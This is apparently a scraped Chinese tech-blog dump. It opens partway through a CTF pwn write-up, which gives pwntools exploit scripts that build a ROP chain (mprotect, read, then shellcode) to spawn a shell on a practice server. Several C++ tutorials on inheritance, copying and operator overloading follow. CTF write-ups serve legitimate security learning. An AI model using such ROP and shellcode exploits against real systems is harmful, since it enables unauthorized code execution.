构造ROP链条的方法相当于在输入函数返回后进入了我们构造的函数链条里，进行了一系列操作后开始执行我们植入的shellcode，这样整个过程都是正常的函数跳转，就不会造成程序崩溃，也就可以利用pwntools获取到程序正常开启的shell。 ¶（三）ROP链条构造 ​ 本题ROP链条较为简单，整体可以概括为： 1gets()-&gt;mprotect()-&gt;read-&gt;shellcode ​ gets()获取输入后，首先被栈溢出覆盖到返回地址，接着进入mprotect()函数，在这里修改一个内存页的权限后返回到read()函数，这里从输入端再获取一次输入并保存到刚才修改好的内存页里，最后返回到这个内存页里实现shellcode的执行。这里我们就可以在利用ROP链条构造出的read()函数的输入这里发送利用pwntools生成的shellcode，实现植入。 ​ ROP链条里通过拼接合适的pop|ret指令来保持栈平衡，确保堆栈完好，程序正常跳转。 ¶三、EXP ¶（一）本地 12345678910from pwn import *from LibcSearcher import *prog = process('./get_started_3dsctf_2016')payload = b'a'*(0x38)# + p32(0x080489B8)payload += p32(0x080489A0) + p32(0x0804E6A0)payload += p32(0x308CD64F) + p32(0x195719D1)prog.sendline(payload)sleep(0.1)print(prog.recv()) ¶（二）远程 123456789101112131415161718192021222324252627282930from pwn import *from LibcSearcher import *q = remote('node4.buuoj.cn',25618)mprotect = 0x0806EC80buf = 0x08048000 # 要修改的地址# 0x0806fc08 : pop esi ; pop ebx ; pop edx ; retpop_3_ret = 0x0806fc08 # 这个地址开始有连续3个pop加上一个ret，用于栈还原read_addr = 0x0806E140 # read函数地址payload = b'a'*56payload += p32(mprotect)payload += p32(pop_3_ret)payload += p32(buf)payload += p32(0x1000)payload += p32(0x7)payload += p32(read_addr) # mprotect返回到read函数payload += p32(pop_3_ret)payload += p32(0)payload += p32(buf)payload += p32(0x100)payload += p32(buf) #将read函数的返回地址设置到我们修改的内存的地址，之后我们要往里面写入shellcodeq.sendline(payload)sleep(0.1)shellcode = asm(shellcraft.sh(),arch='i386',os='linux')q.sendline(shellcode)sleep(0.1)q.interactive() ¶四、总结 ​ 这题就两个知识点：① ROP链条构造 ；② mprotect函数利用 。这里mprotect()函数主要是要注意内存起始地址和内存大小这两个参数的选取要符合函数执行的条件，而这题的ROP链条构造比较特殊的地方就在于：虽然32位程序传参不需要利用寄存器，但是我们的攻击方法是通过对函数的多层调用，这就需要对程序持续控制，因此还是需要用gadget来维护链条。 ​ ROP链条构造的原理和EXP实现的具体讲解还是另开一篇吧……","link":"/2022/08/16/ROP%E9%93%BE%E6%9D%A1%E6%9E%84%E9%80%A0-mprotect%E5%86%99%E5%85%A5shellcode/"},{"title":"C++面向对象知识点梳理","text":"​ C++面向对象的基础知识点梳理 ¶知识点梳理 ¶（一）虚函数 ​ 虚函数在C++中表现为函数定义前面有一个virtual关键字，它的用途是使得基类指针能够调用派生类的函数，实现运行时绑定。 ​ 当基类的某个成员方法，在大多数情形下都应该由子类提供个性化实现，但基类也可以提供一个备选方案的时候，可以将其设计为虚函数，实现多态。 ​ 当基类的某个成员方法，必须由子类提供个性化实现的时候，就应该将其设计为纯虚函数，其特征是在函数声明后面加上一个=0。基类只提供接口，实现完全在派生类根据场景定制。当一个类存在纯虚函数时，它就是一个接口类，就不能对这个类直接实例化了，因为它只是一个抽象类（参考java里的接口的概念）。应该通过实例化它的派生类来调用对应函数。 ​ 虚函数和普通的函数实际上是存储在不同的区域的，虚函数所在的区域是可被覆盖（也称复写override）的，每当子类定义相同名称的虚函数时就将原来基类的版本给覆盖了，另一侧面也说明了为什么基类中声明的虚函数在后代类中不需要另加声明一律自动为虚函数，因为它所存储的位置不会发生改变，虚函数表可以保证调用对应虚函数。而普通函数的存储区域不会覆盖，每个类都有自己独立的区域互不相干。 ​ 看到这里可能大家会觉得，虚函数和实函数好像没什么区别，派生类直接重载不就好了吗，这里就涉及到了C++的面向对象编程的特性，也是我在学习过程中感到它与java不同的地方。看一下下面的实例： 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;using namespace std;class A{ public: void fun1(){ cout&lt;&lt;&quot;A::fun1&quot;&lt;&lt;endl; } void v_fun1(){ cout&lt;&lt;&quot;A::v_fun1&quot;&lt;&lt;endl; } virtual void for_child(){ cout&lt;&lt;&quot;A::for_child&quot;&lt;&lt;endl; }};class B:public A{ public: B(){ cout&lt;&lt;&quot;B init&quot;&lt;&lt;endl; } void fun1(){ cout&lt;&lt;&quot;B::fun1&quot;&lt;&lt;endl; } void v_fun1(){ cout&lt;&lt;&quot;B::v_fun1&quot;&lt;&lt;endl; } void for_child(){ cout&lt;&lt;&quot;B::for_child&quot;&lt;&lt;endl; }};int main(){ cout&lt;&lt;&quot;虚函数demo&quot;&lt;&lt;endl; A* p = new B(); p-&gt;fun1(); p-&gt;v_fun1(); p-&gt;for_child(); return 0;} ​ 我们看一下执行结果： ​ ​ 可以发现，我们在主函数的调用里是将p指针指向基类A，而实例化B对象，但是程序的输出里，基类没有用virtual关键字修饰的两个函数即使在派生类定义了同名函数，也仍然调用了基类的函数。因此可以得出以下结论： ​ ① 子类可以重写父类的虚函数实现子类的特殊化 ​ ② 普通函数是父类为子类提供的强制实现 ​ 接下来介绍两个关键字。 ​ （1）override ​ override关键字加在函数声明后面，用于明确表示派生类的这个虚函数是重写基类的，如果派生类与基类虚函数的签名不一致，编译器就会报错。防止在重写方法时意外创建了新的方法而因为没有报错使得问题被忽略，导致程序运行错误。 ​ （2）final ​ 如果不希望某个类被继承，或不希望某个虚函数被重写，则可以在类名和虚函数后加上 final 关键字，加上 final 关键字后，再被继承或重写，编译器就会报错。 ​ 虚指针（vptr）和虚表（vtbl） ​ 在类的继承中，每一个class产生一堆指向virtual function的指针，放在 vtbl（虚表）中。对于每一个class object 被添加了一个指针，指向相关的virtual table，这里指针称为 vptr（虚指针）。 ​ 虚指针是指向虚函数表首地址的指针，存在于每个基类对象的内存中。 ​ 虚表是在编译阶段生成的，编译器将类中虚函数的地址存放在虚函数表中，虚函数表存在于全局数据区.data，每个类仅有一个，供所有对象共享。 ​ 概括一下，虚函数是用于实现多态的。进一步，如果需要运行时的多态就可以利用虚函数和向下造型或引用子类对象的方法来实现。 ¶（二）继承 ​ C++的继承机制分为单继承和多继承，单继承的实现比较简单，上面用于解释虚函数的代码就是单继承。这里详细描述一下各种继承方式。 ​ public继承：默认继承方式，基类成员的访问权限由基类的定义决定。 ​ protected继承：基类的公有成员在子类里变为protected权限，实例化子类对象后不能直接调用，要在子类里定义一个函数来嵌套调用。 ​ private继承：基类的公有和受保护成员在子类里都是不可见的，如果要访问需要嵌套调用基类的方法。 ​ ps：基类里的private成员无法被派生类继承，上述的各种继承方式只是可以用于实现不同类之间一些特殊的关系（如：飞机和翅膀，这两者没有所谓继承关系，但是飞机要实现飞行的功能，而广义上的翅膀是具备飞行功能的，这时就可以让飞机这个类私有继承翅膀类，然后只重写飞行的函数即可。）因此，上述继承方式的操作对象仍然是基类的public和protect成员。 ​ 示例： ​ public继承： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;iostream&gt;using namespace std; class Person{public: void Print() { cout &lt;&lt; &quot;base name:&quot; &lt;&lt; _name &lt;&lt; endl; cout &lt;&lt; &quot;base age:&quot; &lt;&lt; _age &lt;&lt; endl; }protected: string _name = &quot;base_Person&quot;;private: int _age = 24;};class Student : public Person{public: void doPrint(){ Print(); } void fun() { _name = &quot;Derived Stu&quot;; //_age = 20; 基类的私有对象无法被继承 } void showProtected() { cout&lt;&lt;this-&gt;_name&lt;&lt;endl; //cout&lt;&lt;this-&gt;_age&lt;&lt;endl; } void showStuNo() { cout&lt;&lt;this-&gt;_stuNo&lt;&lt;endl; }protected: int _stuNo = 114514;};int main(){ Student s; s.Print(); s.fun(); s.showProtected(); s.showStuNo(); return 0;} ​ protected继承： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;iostream&gt;using namespace std; class Person{public: void Print() { cout &lt;&lt; &quot;base name:&quot; &lt;&lt; _name &lt;&lt; endl; cout &lt;&lt; &quot;base age:&quot; &lt;&lt; _age &lt;&lt; endl; }protected: string _name = &quot;base_Person&quot;;private: int _age = 24;};class Student : protected Person{public: void doPrint(){ Print(); } void fun() { _name = &quot;Derived Stu&quot;; //_age = 20; 基类的私有对象无法被继承 } void showProtected() { cout&lt;&lt;this-&gt;_name&lt;&lt;endl; //cout&lt;&lt;this-&gt;_age&lt;&lt;endl; } void showStuNo() { cout&lt;&lt;this-&gt;_stuNo&lt;&lt;endl; }protected: int _stuNo = 114514;};int main(){ Student s; //s.Print(); s.doPrint(); s.fun(); s.showProtected(); s.showStuNo(); return 0;} ​ private继承： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;iostream&gt;using namespace std; class Person{public: void Print() { cout &lt;&lt; &quot;base name:&quot; &lt;&lt; _name &lt;&lt; endl; cout &lt;&lt; &quot;base age:&quot; &lt;&lt; _age &lt;&lt; endl; }protected: string _name = &quot;base_Person&quot;;private: int _age = 24;};class Student : private Person{public: void doPrint(){ Print(); } void fun() { _name = &quot;Derived Stu&quot;; //_age = 20; 基类的私有对象无法被继承 } void showProtected() { cout&lt;&lt;this-&gt;_name&lt;&lt;endl; //cout&lt;&lt;this-&gt;_age&lt;&lt;endl; } void showStuNo() { cout&lt;&lt;this-&gt;_stuNo&lt;&lt;endl; }protected: int _stuNo = 114514;};int main(){ Student s; //s.Print(); s.doPrint(); s.fun(); s.showProtected(); s.showStuNo(); return 0;} ​ 这三种继承方式通过以上操作都可以获得相同输出： ​ 由此可见，private继承其实效果和protected差不多，它主要是在多级继承中起到隔离不必要的基类成员访问权限的作用。 ​ 多继承后续另开一篇… ¶（三）重载 ​ 重载是指将功能相同但是处理不同类型参数的函数用同一名字命名，便于调用的操作，要注意它和覆盖的区别。 ​ 接下来介绍重载相关的两个概念 ​ 隐藏： ​ 隐藏是指派生类的函数隐藏了基类的同名函数，本质上是通过在派生类里重载基类的实函数来实现子类对象的多态性，但是这种多态很不灵活。下面是代码示例： 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;using namespace std;class Base{public: void f(int a) {cout &lt;&lt; &quot;Base f(int): &quot; &lt;&lt; a &lt;&lt; endl;} //隐藏 void g(int a) {cout &lt;&lt; &quot;Base g(int): &quot; &lt;&lt; a &lt;&lt; endl;} //隐藏 virtual void h(int a) {cout &lt;&lt; &quot;Base h(int): &quot; &lt;&lt; a &lt;&lt; endl;} //覆盖};class Derived : public Base{public: void f(float a) {cout &lt;&lt; &quot;f(int): &quot; &lt;&lt; a &lt;&lt; endl;} void g(float a) {cout &lt;&lt; &quot;g(int): &quot; &lt;&lt; a &lt;&lt; endl;} void h(int a) {cout &lt;&lt; &quot;h(int): &quot; &lt;&lt; a &lt;&lt; endl;}};int main(void){ Derived d; Base *p = &amp;d; p-&gt;f(1); d.f(2); p-&gt;g(3); d.g(4); p-&gt;h(5); d.h(6); return 0;} ​ 可见：在向下指定时，这种隐藏的效果并不如虚函数灵活；而在正常调用派生类的实例化对象时，若参数不同，则基类函数被隐藏；若参数相同，且基类没有virtual关键词，则隐藏。（有virtual被覆盖） ​ 重载运算符： ​ 重载运算符一般用于实现在需要对复杂的数据类型（如结构体）通过简单的运算符来操作的需求，在C++中可以用operator加上运算符来替代函数名，表示函数。重载运算符的函数如果定义了两个形参，就必须要使用friend关键词，将成员函数改为友员函数，友员函数没有this指针。全局函数和友员函数相同。 ​ 示例： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;iostream&gt;using namespace std;class Symbol{public: friend Symbol operator +(Symbol&amp; a, Symbol&amp; b) { Symbol s; s.Length = a.Length + b.Length; s.Width = a.Width + b.Width; s.Height = a.Height + b.Height; return s; } Symbol operator -(Symbol&amp; a) { Symbol s; s.Length = this-&gt;Length - a.Length; s.Width = this-&gt;Width - a.Width; s.Height = this-&gt;Height - a.Height; return s; } int Length; int Width; int Height;};int main(void){ Symbol a; Symbol b; Symbol s; a.Length = 1; a.Width = 2; a.Height = 3; b.Length = 4; b.Width = 5; b.Height = 6; s = a + b; cout &lt;&lt; &quot;s.Length: &quot; &lt;&lt;s.Length &lt;&lt; &quot;\\ns.Width: &quot; &lt;&lt; s.Width \\ &lt;&lt; &quot;\\ns.Height: &quot; &lt;&lt; s.Height &lt;&lt; endl; s = b - a; cout &lt;&lt; &quot;\\ns.Length: &quot; &lt;&lt;s.Length &lt;&lt; &quot;\\ns.Width: &quot; &lt;&lt; s.Width \\ &lt;&lt; &quot;\\ns.Height: &quot; &lt;&lt; s.Height &lt;&lt; endl; return 0;}","link":"/2022/09/05/C++%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86/"},{"title":"C++ 对象拷贝篇","text":"​ 梳理C++中的对象拷贝相关知识。 ¶1、拷贝构造函数 ​ 当我们需要用一个对象的数据去初始化另一个对象时，不可避免的问题就是对象内的数据的拷贝。C++对此的解决方案是提供了一个默认的拷贝函数，这个默认函数会将源对象的内容赋值给新对象。实现拷贝构造 ​ 示例代码如下： 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;class Test{private: int* p;public: Test(int x) { this-&gt;p=new int(x); cout &lt;&lt; &quot;对象被创建&quot; &lt;&lt; endl; } ~Test() { cout &lt;&lt; &quot;对象被释放&quot; &lt;&lt; endl; } int getX() { return *p; }};int main(){ Test a(10); cout&lt;&lt;&quot;a.getX() = &quot;&lt;&lt;a.getX()&lt;&lt;endl; Test b = a; cout&lt;&lt;&quot;b.getX() = &quot;&lt;&lt;b.getX()&lt;&lt;endl; return 0;} ​ 结果如下 ​ 可见，这里实现了对象的拷贝。 ¶2、深拷贝与浅拷贝 ​ C++默认的拷贝构造函数实现的是浅拷贝，如果遇到指针对象，它也会通过直接赋值的方式进行传值，这时如果源对象的指针变量被释放，会导致新的拷贝对象里的对应变量也被释放使得程序出错。 ​ 浅拷贝： 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;class Test{private: int* p;public: Test(int x) { this-&gt;p=new int(x); cout &lt;&lt; &quot;对象被创建&quot; &lt;&lt; endl; } ~Test() { if (p != NULL) { delete p; } cout &lt;&lt; &quot;对象被释放&quot; &lt;&lt; endl; } int getX() { return *p; }};int main(){ Test a(10); cout&lt;&lt;&quot;a.getX() = &quot;&lt;&lt;a.getX()&lt;&lt;endl; Test b = a; cout&lt;&lt;&quot;b.getX() = &quot;&lt;&lt;b.getX()&lt;&lt;endl; return 0;} ​ 结果如下： ​ 深拷贝的原理是通过在堆上开辟新的内存空间用于存储数据，实现对象间数据的独立性。 ​ 深拷贝： 12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;class Test{private: int* p;public: Test(int x) { this-&gt;p=new int(x); cout &lt;&lt; &quot;对象被创建&quot; &lt;&lt; endl; } ~Test() { if (p != NULL) { delete p; } cout &lt;&lt; &quot;对象被释放&quot; &lt;&lt; endl; } Test(const Test&amp; src) { this-&gt;p = new int(*src.p); cout &lt;&lt; &quot;对象深拷贝&quot; &lt;&lt; endl; } int getX() { return *p; }};int main(){ Test a(10); Test b = a; return 0;} ​ 结果如下： ​ 效果达到预期。 ¶附：一个深拷贝实例 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;class Data{public: string context; Data(){ cout&lt;&lt;&quot;Data对象无参初始化&quot;&lt;&lt;endl; } Data(string con){ cout&lt;&lt;&quot;Data对象带参初始化&quot;&lt;&lt;endl; this-&gt;context = con; } ~Data(){ cout&lt;&lt;&quot;Data对象被释放&quot;&lt;&lt;endl; }};class Test{private: int* p; Data* data;public: Test(int x,string str) { this-&gt;data = new Data(str); this-&gt;p=new int(x); cout &lt;&lt; &quot;Test对象被创建&quot; &lt;&lt; endl; } ~Test() { if (p != NULL) { delete p; p = NULL; } if(data != NULL){ cout&lt;&lt;&quot;开始释放Data对象&quot;&lt;&lt;endl; delete data; data = NULL; } cout &lt;&lt; &quot;Test对象被释放&quot; &lt;&lt; endl; } Test(const Test&amp; src) { cout &lt;&lt; &quot;Test对象开始深拷贝&quot; &lt;&lt; endl; this-&gt;p = new int(*src.p); this-&gt;data = new Data(src.data-&gt;context); cout &lt;&lt; &quot;Test对象深拷贝&quot; &lt;&lt; endl; } int getX() { return *p; } string getData() {return this-&gt;data-&gt;context;}};int main(){ Test a(10,&quot;dataA&quot;); cout&lt;&lt;&quot;a.p = &quot;&lt;&lt;a.getX()&lt;&lt;endl; cout&lt;&lt;&quot;a.data-&gt;context = &quot;&lt;&lt;a.getData()&lt;&lt;endl; Test b(a); cout&lt;&lt;&quot;b.p = &quot;&lt;&lt;b.getX()&lt;&lt;endl; cout&lt;&lt;&quot;b.data-&gt;context = &quot;&lt;&lt;b.getData()&lt;&lt;endl; // delete &amp;a; // delete &amp;b; return 0;} ​ 这段代码仍然存在问题，结尾的两个delete操作存在重复释放 ​ 结果：","link":"/2022/09/13/C++%E5%AF%B9%E8%B1%A1%E6%8B%B7%E8%B4%9D%E7%AF%87/"},{"title":"C++ 继承机制","text":"​ 分析C++继承机制中的多继承、虚继承机制的运用和菱形继承问题的成因及解决方法 ¶1、多继承 基本原理和语法 ​ 已知 C++ 支持多继承机制，使得一个派生类可以有多个基类，这样设计可以让一个派生类同时继承不同基类的一些特性。这种机制实际上容易导致代码逻辑变得比较复杂和混乱，因此许多编程语言并没有采用这一机制。例如java对这类需求就是用单继承多接口的方式来解决的，这里还是分析一下 C++ 的这一特性的运用方法。 ​ 我们看一下一个简单的多继承例子，每个类都只有一个成员变量和构造、析构函数。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;class A{public: A(){ cout&lt;&lt;&quot;A类无参构造&quot;&lt;&lt;endl; A_p1 = new int(100); } ~A(){ cout&lt;&lt;&quot;A类析构&quot;&lt;&lt;endl; if(A_p1 != NULL){ delete A_p1; A_p1 = NULL; } } int* A_p1;};class B{public: B(){ cout&lt;&lt;&quot;B类无参构造&quot;&lt;&lt;endl; B_p1 = new int(200); } ~B(){ cout&lt;&lt;&quot;B类析构&quot;&lt;&lt;endl; if(B_p1 != NULL){ delete B_p1; B_p1 = NULL; } } int* B_p1;};class C:public A,public B{public: C(){ cout&lt;&lt;&quot;C类无参构造&quot;&lt;&lt;endl; C_p1 = new int(300); } ~C(){ cout&lt;&lt;&quot;C类析构&quot;&lt;&lt;endl; if(C_p1 != NULL){ delete C_p1; C_p1 = NULL; } } int* C_p1;};int main(){ C c1; cout&lt;&lt;*c1.A_p1&lt;&lt;endl; cout&lt;&lt;*c1.B_p1&lt;&lt;endl; cout&lt;&lt;*c1.C_p1&lt;&lt;endl; //delete &amp;c1; return 0;} ​ 结果如下，可以看到析构和构造的顺序都是正常的，不同基类间的构造先后次序由这些基类声明的顺序决定。 同名成员处理 ​ 多继承中的同名成员命名冲突是通过在成员名字前面加上类名和域解析符::来显示指明，消除二义性。 ​ 示例： ​ 报错代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;class A{public: A(){ cout&lt;&lt;&quot;A类无参构造&quot;&lt;&lt;endl; A_p1 = new int(100); } ~A(){ cout&lt;&lt;&quot;A类析构&quot;&lt;&lt;endl; if(A_p1 != NULL){ delete A_p1; A_p1 = NULL; } } int* A_p1;};class B{public: B(){ cout&lt;&lt;&quot;B类无参构造&quot;&lt;&lt;endl; B_p1 = new int(200); } ~B(){ cout&lt;&lt;&quot;B类析构&quot;&lt;&lt;endl; if(B_p1 != NULL){ delete B_p1; B_p1 = NULL; } } int* B_p1;};class B2{public: B2(){ cout&lt;&lt;&quot;B2类无参构造&quot;&lt;&lt;endl; B_p1 = new int(250); } ~B2(){ cout&lt;&lt;&quot;B2类析构&quot;&lt;&lt;endl; if(B_p1 != NULL){ delete B_p1; B_p1 = NULL; } } int* B_p1;};class C:public A,public B,public B2{public: C(){ cout&lt;&lt;&quot;C类无参构造&quot;&lt;&lt;endl; C_p1 = new int(300); } ~C(){ cout&lt;&lt;&quot;C类析构&quot;&lt;&lt;endl; if(C_p1 != NULL){ delete C_p1; C_p1 = NULL; } } int* C_p1;};int main(){ C c1; cout&lt;&lt;*c1.A_p1&lt;&lt;endl; cout&lt;&lt;*c1.B_p1&lt;&lt;endl; cout&lt;&lt;*c1.C_p1&lt;&lt;endl; return 0;} ​ 编译出错： ​ 正确代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;class A{public: A(){ cout&lt;&lt;&quot;A类无参构造&quot;&lt;&lt;endl; A_p1 = new int(100); } ~A(){ cout&lt;&lt;&quot;A类析构&quot;&lt;&lt;endl; if(A_p1 != NULL){ delete A_p1; A_p1 = NULL; } } int* A_p1;};class B{public: B(){ cout&lt;&lt;&quot;B类无参构造&quot;&lt;&lt;endl; B_p1 = new int(200); } ~B(){ cout&lt;&lt;&quot;B类析构&quot;&lt;&lt;endl; if(B_p1 != NULL){ delete B_p1; B_p1 = NULL; } } int* B_p1;};class B2{public: B2(){ cout&lt;&lt;&quot;B2类无参构造&quot;&lt;&lt;endl; B_p1 = new int(250); } ~B2(){ cout&lt;&lt;&quot;B2类析构&quot;&lt;&lt;endl; if(B_p1 != NULL){ delete B_p1; B_p1 = NULL; } } int* B_p1;};class C:public A,public B,public B2{public: C(){ cout&lt;&lt;&quot;C类无参构造&quot;&lt;&lt;endl; C_p1 = new int(300); } ~C(){ cout&lt;&lt;&quot;C类析构&quot;&lt;&lt;endl; if(C_p1 != NULL){ delete C_p1; C_p1 = NULL; } } int* C_p1;};int main(){ C c1; cout&lt;&lt;*c1.A_p1&lt;&lt;endl; cout&lt;&lt;*c1.B::B_p1&lt;&lt;endl; cout&lt;&lt;*c1.B2::B_p1&lt;&lt;endl; cout&lt;&lt;*c1.C_p1&lt;&lt;endl; return 0;} ​ 结果： ​ 同名成员函数也是通过声明作用域来解决命名冲突。 ¶2、虚继承和菱形继承问题的解决 ​ 虚继承是C++特有的一个特性，当出现菱形继承时，派生类里存储了多个相同的间接基类，这会造成空间浪费和二义性的问题，因此需要使用虚继承技术来解决。 ​ 在继承方式前面加上 virtual 关键字就是虚继承，虚基类主要解决在多重继承时，基类可能被多次继承，虚基类主要是提供一个基类给派生类。虚表指针在整个继承关系中是共享的，不共享的是指向虚基类的指针。 ​ 示例代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;class A{public: A(){ cout&lt;&lt;&quot;A类无参构造&quot;&lt;&lt;endl; A_p1 = new int(100); } ~A(){ cout&lt;&lt;&quot;A类析构&quot;&lt;&lt;endl; if(A_p1 != NULL){ delete A_p1; A_p1 = NULL; } } int* A_p1;};class B:virtual public A{public: B(){ cout&lt;&lt;&quot;B类无参构造&quot;&lt;&lt;endl; B_p1 = new int(200); } void func(){ cout&lt;&lt;&quot;func成员函数--爱来自B类&quot;&lt;&lt;endl; } ~B(){ cout&lt;&lt;&quot;B类析构&quot;&lt;&lt;endl; if(B_p1 != NULL){ delete B_p1; B_p1 = NULL; } } int* B_p1;};class B2:virtual public A{public: B2(){ cout&lt;&lt;&quot;B2类无参构造&quot;&lt;&lt;endl; B_p1 = new int(250); } void func(){ cout&lt;&lt;&quot;func成员函数--爱来自B2类&quot;&lt;&lt;endl; } ~B2(){ cout&lt;&lt;&quot;B2类析构&quot;&lt;&lt;endl; if(B_p1 != NULL){ delete B_p1; B_p1 = NULL; } } int* B_p1;};class C:virtual public B,virtual public B2{public: C(){ cout&lt;&lt;&quot;C类无参构造&quot;&lt;&lt;endl; C_p1 = new int(300); } ~C(){ cout&lt;&lt;&quot;C类析构&quot;&lt;&lt;endl; if(C_p1 != NULL){ delete C_p1; C_p1 = NULL; } } int* C_p1;};int main(){ C c1; cout&lt;&lt;*c1.A_p1&lt;&lt;endl; cout&lt;&lt;*c1.B::B_p1&lt;&lt;endl; cout&lt;&lt;*c1.B2::B_p1&lt;&lt;endl; c1.B::func(); c1.B2::func(); cout&lt;&lt;*c1.C_p1&lt;&lt;endl; return 0;} ​ 结果： ​ 虚继承有一个不太直观的特征： 必须在虚派生的真实需求出现前就已经完成虚派生的操作。在上图中，当定义 D 类时才出现了对虚派生的需求，但是如果 B 类和 C 类不是从 A 类虚派生得到的，那么 D 类还是会保留 A 类的两份成员。 ​ 换个角度讲，虚派生只影响从指定了虚基类的派生类中进一步派生出来的类，它不会影响派生类本身。 ​ 在实际开发中，位于中间层次的基类将其继承声明为虚继承一般不会带来什么问题。通常情况下，使用虚继承的类层次是由一个人或者一个项目组一次性设计完成的。对于一个独立开发的类来说，很少需要基类中的某一个类是虚基类，况且新类的开发者也无法改变已经存在的类体系。 爱来自CSDN ​ 在网上看到的拓展：C++标准库中的 iostream 类就是一个虚继承的实际应用案例。iostream 从 istream 和 ostream 直接继承而来，而 istream 和 ostream 又都继承自一个共同的名为 base_ios 的类，是典型的菱形继承。此时 istream 和 ostream 必须采用虚继承，否则将导致 iostream 类中保留两份 base_ios 类的成员。 ¶总结 ​ 虽然有虚继承可以用来作为多继承中一些问题的语法糖，但是这种编程方式还是给人一种比较麻烦的感觉，可能是因为C++没有Java里的implement吧，个人建议还是少用这个，个人建议。","link":"/2022/09/15/C++%E7%BB%A7%E6%89%BF%E6%9C%BA%E5%88%B6/"},{"title":"C++ 运算符重载","text":"​ 整理C++中的一些常用的运算符重载方式 ¶概述 ​ 运算符重载的本质上是函数重载，但需要遵循一些规则 ​ ① 重载运算符的运算顺序和优先级不变，操作数个数不变。 ​ ② 不能创造新的运算符，只能重载C++中已有的运算符，并且规定有6个运算符不能重载,如表所示。 ​ 有6个运算符不能重载： ​ 运算符重载有成员函数、全局函数等多种方式，全局函数重载的话还可以运用友元函数的特性来访问类内私有属性，这里只是简单整理一些基础的，实际运用可以根据需要自己拓展。 ¶1、加减号 ​ 以结构体加减法为例，使用成员函数重载运算符 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;class Complex{public: double real; double imag; Complex(double r = 0.0,double i = 0.0){ real = r; imag = i; } Complex operator+(const Complex&amp; adder); Complex operator-(const Complex&amp; suber);};Complex Complex::operator+(const Complex&amp; adder){ Complex tmp; tmp.real = this-&gt;real + adder.real; tmp.imag = this-&gt;imag + adder.imag; return tmp;}Complex Complex::operator-(const Complex&amp; adder){ Complex tmp; tmp.real = this-&gt;real - adder.real; tmp.imag = this-&gt;imag - adder.imag; return tmp;}int main(){ Complex c1(20,20); Complex c2(5,5); Complex c3,c4; c3 = c1+c2; c4 = c1-c2; cout&lt;&lt;&quot;c3:real = &quot;&lt;&lt;c3.real&lt;&lt;endl; cout&lt;&lt;&quot;c3:imag = &quot;&lt;&lt;c3.imag&lt;&lt;endl; cout&lt;&lt;&quot;c4:real = &quot;&lt;&lt;c4.real&lt;&lt;endl; cout&lt;&lt;&quot;c4:imag = &quot;&lt;&lt;c4.imag&lt;&lt;endl; return 0;} ​ 结果： ¶2、左移 ​ 左移运算符只能用全局函数重载，可以用于实现类对象的类似Java中的toString功能。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;class Complex{public: double real; double imag; Complex(double r = 0.0,double i = 0.0){ real = r; imag = i; } Complex operator+(const Complex&amp; adder); Complex operator-(const Complex&amp; suber); //void operator&lt;&lt;(ostream &amp;cout,Person &amp;p);};Complex Complex::operator+(const Complex&amp; adder){ Complex tmp; tmp.real = this-&gt;real + adder.real; tmp.imag = this-&gt;imag + adder.imag; return tmp;}Complex Complex::operator-(const Complex&amp; adder){ Complex tmp; tmp.real = this-&gt;real - adder.real; tmp.imag = this-&gt;imag - adder.imag; return tmp;}ostream&amp; operator&lt;&lt;(ostream &amp;out,Complex &amp;c){ if(c.imag&lt;0){ cout&lt;&lt;&quot;c = &quot;&lt;&lt;c.real &lt;&lt; &quot;-&quot;&lt;&lt;-c.imag&lt;&lt;&quot;i&quot;; }else cout&lt;&lt;&quot;c = &quot;&lt;&lt;c.real &lt;&lt; &quot;+&quot;&lt;&lt;c.imag&lt;&lt;&quot;i&quot;; return out;}int main(){ Complex c1(20,20); Complex c2(5,5); Complex c3,c4; c3 = c1+c2; c4 = c1-c2; cout&lt;&lt;c3&lt;&lt;endl; cout&lt;&lt;c4&lt;&lt;endl; return 0;} ​ 结果： ¶3、左右递增 ​ 实现左递增（先加一再运算） 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;class MyInteger{ public: MyInteger(int i=0):num(i){ //构造 } // ++MyInteger MyInteger&amp; operator++(){ num++; return *this; } int num;};ostream&amp; operator&lt;&lt;(ostream &amp;out,MyInteger &amp;mi){ cout&lt;&lt;mi.num; return out;}int main(){ MyInteger mi(5); cout&lt;&lt;mi&lt;&lt;endl; cout&lt;&lt;++mi&lt;&lt;endl; cout&lt;&lt;mi&lt;&lt;endl; return 0;} ​ 结果： ​ 实现右递增（先运算后加一），这里的重点是先保存当前状态再把传入的类对象加一，然后把保存的状态以值传递的形式返回出去。 ​ 这里由于我们返回的数据只在这次返回有效，所以选择了用局部变量加值传递的方法，如果使用引用的方式，局部变量在函数执行结束后就释放了，这样后面再在外部调用引用就会出错。这使得后置++无法很好的实现多重递增叠加的效果。 